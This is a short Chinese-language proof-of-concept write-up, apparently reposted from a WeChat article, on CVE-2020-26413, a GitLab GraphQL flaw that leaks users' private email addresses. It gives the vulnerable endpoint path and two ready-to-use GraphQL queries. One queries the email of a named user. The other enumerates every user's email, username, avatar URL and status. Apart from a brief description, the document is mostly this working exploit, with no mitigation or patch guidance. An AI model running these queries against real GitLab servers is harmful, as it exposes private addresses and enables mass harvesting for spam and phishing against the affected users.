# CVE-2020-26413--GraphiQL邮箱信息泄露

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI1MDk3NDc5Mg==&mid=2247483909&idx=1&sn=362dcb80ae9e9469bd59ea413d3ceb8c&chksm=e9fb4522de8ccc347cfa6b93fef4fa6df436d907831553e134ea08cdac28c7ad08460a4f37bb&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzI1MDk3NDc5Mg==&mid=2247483909&idx=1&sn=362dcb80ae9e9469bd59ea413d3ceb8c&chksm=e9fb4522de8ccc347cfa6b93fef4fa6df436d907831553e134ea08cdac28c7ad08460a4f37bb&scene=27#wechat_redirect)

![](../Images/e7843a6e2a1bfb3c22359055378a519f.png)

漏洞描述：

##   

## Able to leak private email of any user given his/her username via graphql

## 能够通过 graphql 泄露给定用户名的任何用户的私人电子邮件，仅通过知道用户名就泄露用户的私人电子邮件。 攻击者可以利用这个漏洞大量泄露 gitlab 用户的私人邮件。

  

![](../Images/639fca932bb675c7b555611c29bb561a.png)

  

漏洞url路径 /-//graphql-explorer

  

![](../Images/3df800bbd294b449dd6ad335bf9b2f5b.png)

  

利用代码

  

query {    
  user(username:"root"){    
    email    
    username    
  }    
}  
  
  

![](../Images/16fe9ff5d238ada7ea247ba5cb33d2b9.png)

  

  

通过构造语句返回所有的用户名，邮箱和URL

  

{    
    users {  
      edges {  
        node {  
          email    
    username  
          avatarUrl  
          status{  
            emoji  
            message  
            messageHtml  
        }  
      }  
    }  
  }    
}
